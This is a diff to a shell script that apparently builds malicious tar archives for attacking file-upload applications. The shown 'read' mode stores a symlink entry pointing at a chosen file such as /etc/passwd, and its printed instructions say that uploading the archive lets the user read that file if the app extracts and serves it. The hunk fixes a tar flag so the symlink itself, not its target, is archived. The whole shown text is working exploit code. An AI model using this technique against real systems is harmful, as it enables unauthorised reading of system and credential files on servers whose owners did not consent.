@@ -21,8 +21,8 @@ case "$mode" in
   read)
     target="${2:?target file, e.g. /etc/passwd}"
     ln -s "$target" link
-    tar -chf "$OLDPWD/$out" link            # -h follows? NO: we want the symlink stored. tar stores symlink entries by default; -c only.
-    # NOTE: do NOT use -h (that would dereference). Build with plain -cf so the symlink ENTRY is archived:
+    # store the symlink ENTRY, not its target: do NOT use -h/--dereference (that archives the target's
+    # CONTENT, defeating the read attack — and fails under `set -e` if the target isn't locally readable).
     tar -cf "$OLDPWD/$out" link
     echo "[+] $out contains symlink 'link' -> $target"
     echo "    Upload it; if the app extracts AND later serves 'link', you read $target."
